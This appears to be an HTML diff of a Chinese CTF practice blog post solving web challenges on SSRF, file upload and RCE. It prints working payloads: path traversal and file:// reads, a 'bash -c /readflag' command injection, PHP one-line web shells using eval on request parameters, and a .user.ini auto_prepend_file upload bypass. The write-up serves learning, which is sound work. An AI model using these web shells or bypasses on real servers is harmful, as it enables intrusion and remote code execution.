@@ -1,0 +1,823 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SSRF[NISACTF 2022]easyssrf0x01 这道题的思路比较简单 就是使用ssrf访问文件  给了一个接口，那么就直接访问  跟着他走  file:&#x2F;&#x2F;&#x2F;&#x2F;fl4g		   访问它指定的路径 出现了  file_get_contents   0x02 通过这个函数，我们可以直接访问文件 他又说了文件在flag，所以就直接访问flag 建议直">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web刷题">
+<meta property="og:url" content="https://tsy244.github.io/2023/11/30/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/web%E5%88%B7%E9%A2%98/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="SSRF[NISACTF 2022]easyssrf0x01 这道题的思路比较简单 就是使用ssrf访问文件  给了一个接口，那么就直接访问  跟着他走  file:&#x2F;&#x2F;&#x2F;&#x2F;fl4g		   访问它指定的路径 出现了  file_get_contents   0x02 通过这个函数，我们可以直接访问文件 他又说了文件在flag，所以就直接访问flag 建议直">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130093853864.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130093925060.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130094012524.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130094113614.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130094245225.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130095243554.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130095633444.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130160232238.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130160609970.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130160640457.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130165650011.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201151743522.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201151831483.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201152127655.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201152622012.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201153024703.png">
+<meta property="article:published_time" content="2023-11-30T01:35:09.000Z">
+<meta property="article:modified_time" content="2024-01-04T12:42:08.265Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="CTF刷题记录">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130093853864.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>web刷题 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="web刷题"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-30 09:35" pubdate>
+          November 30, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          26 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">web刷题</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h2><p><strong>0x01</strong></p>
+<p>这道题的思路比较简单</p>
+<p>就是使用ssrf访问文件</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130093853864.png" srcset="/img/loading.gif" lazyload alt="image-20231130093853864"></p>
+<p>给了一个接口，那么就直接访问</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130093925060.png" srcset="/img/loading.gif" lazyload alt="image-20231130093925060"></p>
+<p>跟着他走</p>
+<blockquote>
+<p>file:&#x2F;&#x2F;&#x2F;&#x2F;fl4g		</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130094012524.png" srcset="/img/loading.gif" lazyload alt="image-20231130094012524"></p>
+<p>访问它指定的路径</p>
+<p>出现了</p>
+<blockquote>
+<p>file_get_contents</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130094113614.png" srcset="/img/loading.gif" lazyload alt="image-20231130094113614"></p>
+<p><strong>0x02</strong></p>
+<p>通过这个函数，我们可以直接访问文件</p>
+<p>他又说了文件在<code>flag</code>，所以就直接访问flag</p>
+<p>建议直接尝试比较长的路径</p>
+<blockquote>
+<p>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130094245225.png" srcset="/img/loading.gif" lazyload alt="image-20231130094245225"></p>
+<h2 id="HNCTF-2022-WEEK2-ez-ssrf已解决"><a href="#HNCTF-2022-WEEK2-ez-ssrf已解决" class="headerlink" title="[HNCTF 2022 WEEK2]ez_ssrf已解决"></a>[HNCTF 2022 WEEK2]ez_ssrf已解决</h2><p>[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2949">HNCTF 2022 WEEK2]ez_ssrf | NSSCTF</a></p>
+<p><strong>0x00</strong></p>
+<p>访问他给的地址，然后发现这个</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130095243554.png" srcset="/img/loading.gif" lazyload alt="image-20231130095243554"></p>
+<p>出现了</p>
+<blockquote>
+<p> fsockopen()</p>
+</blockquote>
+<p>那就构造数据发送</p>
+<p><strong>0x01</strong></p>
+<blockquote>
+<p>&#x2F;index.php?host&#x3D;127.0.0.1&amp;port&#x3D;80&amp;data&#x3D;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo&#x3D;</p>
+</blockquote>
+<p>data</p>
+<blockquote>
+<p>GET &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 127.0.0.1<br>Connection: Close</p>
+</blockquote>
+<p>得到flag</p>
+<p>这里就相当于是伪造了一个请求，请求了服务端，但是这个host和port不是很理解</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130095633444.png" srcset="/img/loading.gif" lazyload alt="image-20231130095633444"></p>
+<h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><p>这道题需要代码审计</p>
+<p>访问，出现了源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>       <span class="hljs-variable">$http_x_headers</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>       <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$http_x_headers</span>[<span class="hljs-number">0</span>];<br>   &#125;<br><br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<span class="hljs-comment">// 以上的只是为了告诉我们ip地址，也就是下面加密需要用到的东西</span><br><br>   <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&quot;sandbox/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<span class="hljs-comment">//这个是加密路径，相当于url文件访问路径，有了上面的ip就可以计算出这个值</span><br>   @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//创建目录</span><br>   @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<span class="hljs-comment">//将当前php的目录改为这个</span><br><br>   <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;GET &quot;</span> . <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]));<br>   <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br>   <span class="hljs-variable">$dir</span>  = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;dirname&quot;</span>]));<br>   @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>   @<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$dir</span>);<br>   @<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;basename&quot;</span>]), <span class="hljs-variable">$data</span>);<br>   <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
+
+<p><strong>0x00</strong></p>
+<p>首先先md5找到对应的路径</p>
+<blockquote>
+<p>786c0b7e11c1e9322763fcc8090ef181</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130160232238.png" srcset="/img/loading.gif" lazyload alt="image-20231130160232238"></p>
+<p><strong>0x01</strong></p>
+<p>创建一个目录</p>
+<blockquote>
+<p>?url&#x3D;&#x2F;&amp;filename&#x3D;temp</p>
+</blockquote>
+<p>访问</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://d9768014-7cfd-42d6-841e-07f9b9e5dc90.node4.buuoj.cn/sandbox/786c0b7e11c1e9322763fcc8090ef181/temp">http://d9768014-7cfd-42d6-841e-07f9b9e5dc90.node4.buuoj.cn/sandbox/786c0b7e11c1e9322763fcc8090ef181/temp</a></p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130160609970.png" srcset="/img/loading.gif" lazyload alt="image-20231130160609970"></p>
+<p>出现了一些路径</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130160640457.png" srcset="/img/loading.gif" lazyload alt="image-20231130160640457"></p>
+<p>有一个readfalg，这个是一个程序，所以我们想办法运行，并且将将运行的数据存放到我们的文件里面</p>
+<p>使用bash -c &#x2F;readflag是使用bash运行程序</p>
+<blockquote>
+<p>&#x2F;?url&#x3D;file:bash -c &#x2F;readflag&amp; filename&#x3D;bash -c &#x2F;readflag</p>
+<p>&#x2F;?url&#x3D;bash -c &#x2F;readflag &amp; filename&#x3D;123</p>
+</blockquote>
+<p>然后访问123</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://1e99b289-a06d-43fe-aa18-d5367c10e0d9.node4.buuoj.cn/sandbox/786c0b7e11c1e9322763fcc8090ef181/123">http://1e99b289-a06d-43fe-aa18-d5367c10e0d9.node4.buuoj.cn/sandbox/786c0b7e11c1e9322763fcc8090ef181/123</a></p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/image-20231130165650011.png" srcset="/img/loading.gif" lazyload alt="image-20231130165650011"></p>
+<h1 id="upload-file"><a href="#upload-file" class="headerlink" title="upload file"></a>upload file</h1><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p><strong>0x00 考点</strong></p>
+<ol>
+<li>后缀绕过</li>
+<li>Content-Type</li>
+<li><code>&lt;?</code>绕过</li>
+</ol>
+<p><strong>0x01</strong></p>
+<p>我先尝试直接上传php文件之后</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201151743522.png" srcset="/img/loading.gif" lazyload alt="image-20231201151743522"></p>
+<p><strong>0x02</strong></p>
+<p>修改Content-Type</p>
+<p>0x03</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201151831483.png" srcset="/img/loading.gif" lazyload alt="image-20231201151831483"></p>
+<p>说明已经通过了一个测试点了</p>
+<p>但是这里他说我们上传的是php，说明他检测到了我们的后缀</p>
+<p><strong>0x04</strong></p>
+<p>尝试修改文件名，修改了很多都不行</p>
+<p>我看了其他师傅的wp发现这个地方需要上传<code>phtml</code></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201152127655.png" srcset="/img/loading.gif" lazyload alt="image-20231201152127655"></p>
+<p>他这里开始了内容检查，我们上传不带<code>&lt;?</code></p>
+<p>也就是使用php+html形式</p>
+<p><strong>0x05</strong></p>
+<p>绕过<code>&lt;?</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php+html">GIF89a?<br>&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[value])&lt;/script<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201152622012.png" srcset="/img/loading.gif" lazyload alt="image-20231201152622012"></p>
+<p><strong>0x06</strong></p>
+<p>然后就是连接</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/upload_file/image-20231201153024703.png" srcset="/img/loading.gif" lazyload alt="image-20231201153024703"></p>
+<p>测试出路径为&#x2F;upload</p>
+<h2 id="攻防世界-easyupload"><a href="#攻防世界-easyupload" class="headerlink" title="[攻防世界]easyupload"></a>[攻防世界]easyupload</h2><p><strong>0x00</strong>  前菜</p>
+<p>这道题挺有趣的，首先</p>
+<p>可以尝试上传文件，这个是文件内容的检测，所以需要将一句话木马变成下面这个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>phP <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>我以为游戏结束了，没想到，这个文件不能访问</p>
+<p><strong>0x01</strong>  .htaccess &amp;&amp; .user.ini</p>
+<blockquote>
+<p>.htaccess 这个是apache的配置文件，可以解析图片为php</p>
+<p> .user.ini 与htaccess 类似，但是用的会普遍一点</p>
+</blockquote>
+<p>这里上传**.htaccess** 不行，所以上传.user.ini试试</p>
+<blockquote>
+<p>auto_prepend_file &#x3D; 1.png</p>
+</blockquote>
+<p>这个就是说，与.user.ini同一个目录下的文件都会包含1.png文件</p>
+<p>如果我们在png里面放置木马就会执行这个木马</p>
+<p>那就直接上传.user.ini文件，然后再上传1.png文件</p>
+<p><strong>0x02</strong>  重要</p>
+<p>最重要的是，当前目录之下必须要有php文件，因为没有文件的话，就不能执行1.png</p>
+<p>注意连接的时候也是访问，当前目录的php文件，因为文件本生还是不具有执行权限</p>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h2><p><strong>0X00 被坑了</strong></p>
+<p>这道题看见了eval()函数，这个函数可以把字符串当做php代码执行，但是….</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-misc-eval.html">PHP eval() 函数 | 菜鸟教程 (runoob.com)</a></p>
+<p><strong>0x01  system &amp;&amp; shell_eval</strong></p>
+<p>直接尝试运行代码，读取flag</p>
+<blockquote>
+<p>cat &#x2F;f*</p>
+</blockquote>
+<p>但是这个时候我是用shell_eval()没有任何反应</p>
+<p>当我开始迷茫的时候尝试使用system()执行，出答案</p>
+<p><strong>0x02  区别</strong></p>
+<blockquote>
+<p>shell_exec() 将执行结果当作返回值，并不会主动输出，而是赋值给变量</p>
+</blockquote>
+<blockquote>
+<p>system() 执行命令，并输出到浏览器</p>
+</blockquote>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">#CTF刷题记录</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>web刷题</div>
+      <div>https://tsy244.github.io/2023/11/30/CTF刷题记录/WEB/web刷题/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 30, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/01/web/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%94%BB%E5%87%BB/" title="DNS重绑定攻击">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DNS重绑定攻击</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/30/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/pikachu/" title="pikachu">
+                        <span class="hidden-mobile">pikachu</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
